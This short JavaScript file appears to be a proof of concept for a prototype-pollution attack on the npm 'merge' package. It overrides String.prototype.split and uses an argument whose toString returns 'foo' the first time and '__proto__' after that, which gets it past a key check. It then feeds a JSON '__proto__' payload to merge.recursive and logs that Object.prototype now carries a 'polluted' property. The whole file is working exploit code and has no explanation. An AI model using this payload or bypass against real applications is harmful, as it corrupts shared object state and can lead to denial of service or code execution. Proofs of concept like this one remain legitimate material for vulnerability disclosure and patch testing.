var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const merge = require('merge');
const payload2 = JSON.parse('{"x": {"__proto__":{"polluted":"yes"}}}');
let obj1 = { x: { y: 1 } };
merge.recursive(obj1, payload2);
console.log({}.polluted);